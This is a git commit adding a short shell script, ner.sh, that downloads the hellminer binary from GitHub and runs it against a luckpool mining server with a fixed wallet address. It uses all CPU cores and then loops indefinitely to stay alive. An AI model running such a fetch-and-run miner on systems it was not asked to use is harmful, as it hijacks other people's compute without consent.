1384f4f40519ed18d85d13967d35e64646c16409
malogrono <136266511+malogrono@users.noreply.github.com>
2024-11-12 15:49:54 +0700

    Create ner.sh

---
+++ ner.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xvf hellminer_linux64.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.ha -p x $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
